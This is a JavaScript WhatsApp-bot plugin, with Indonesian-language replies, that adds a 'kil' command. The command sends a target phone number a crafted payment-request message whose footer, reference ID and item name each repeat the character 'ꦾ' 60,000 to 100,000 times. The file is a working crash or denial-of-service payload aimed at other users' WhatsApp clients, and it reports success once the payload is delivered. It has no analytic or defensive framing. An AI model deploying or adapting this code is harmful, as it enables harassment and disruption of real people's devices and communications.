const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
const chalk = require('chalk');

async function PayBlank(sock, target) {
  const msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      interactiveMessage: {
        header: {
          title: "",
          hasMediaAttachment: false
        },
        body: {
          text: ""
        },
        footer: {
          text: "ꦾ".repeat(100000)
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "review_and_pay",
              buttonParamsJson: JSON.stringify({
                currency: "IDR",
                total_amount: {
                  value: 0,
                  offset: 100
                },
                reference_id: "ꦾ".repeat(100000),
                type: "physical-goods",
                order: {
                  status: "payment_requested",
                  subtotal: {
                    value: 0,
                    offset: 100
                  },
                  order_type: "ORDER",
                  items: [
                    {
                      name: "ꦾ".repeat(60000),
                      amount: {
                        value: 0,
                        offset: 100
                      },
                      quantity: 9999
                    }
                  ]
                }
              })
            }
          ]
        }
      }
    }),
    {}
  );

  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

module.exports = {
    command: ['kil'],
    isOwner: false,
    isPremium: false,

    run: async (sock, m, { prefix, command, text, isPremium, isOwner }) => {
        try {
            if (!isOwner && !isPremium) {
                return m.reply("*AKSES DITOLAK* Fitur ini khusus untuk pengguna Premium/Owner!");
            }

            if (!text && (!m.mentionedJid || m.mentionedJid.length === 0)) {
                return m.reply(`Contoh Penggunaan:\n${prefix}${command} 62xx`);
            }

            let mentionedJid;
            if (m.mentionedJid && m.mentionedJid.length > 0) {
                mentionedJid = m.mentionedJid[0];
            } else {
                let jidx = text.replace(/[^0-9]/g, "");
                if (!jidx) return m.reply(`Format nomor tidak valid! Contoh: ${prefix}${command} 628xxxxxx`);
                if (jidx.startsWith('0')) return m.reply(`Gunakan kode negara! Contoh: ${prefix}${command} 628xxxxxx`);
                mentionedJid = `${jidx}@s.whatsapp.net`;
            }

            let targetkil = mentionedJid;
           
            await sock.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
            await m.reply(`Sedang memproses target: @${targetkil.split('@')[0]}`, null, { mentions: [targetkil] });

            for (let i = 0; i < 1; i++) {
                await PayBlank(sock, targetkil); 
            }

            console.log(chalk.red.bold(`✅ Success! "${command}" sent to ${targetkil}`));
            m.reply(`*✅ Success!* "${command}" ke target.`);
            await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        } catch (error) {
            console.error(error);
            m.reply(`❌ Terjadi kesalahan saat mengeksekusi perintah.`);
            await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        }
    }
};
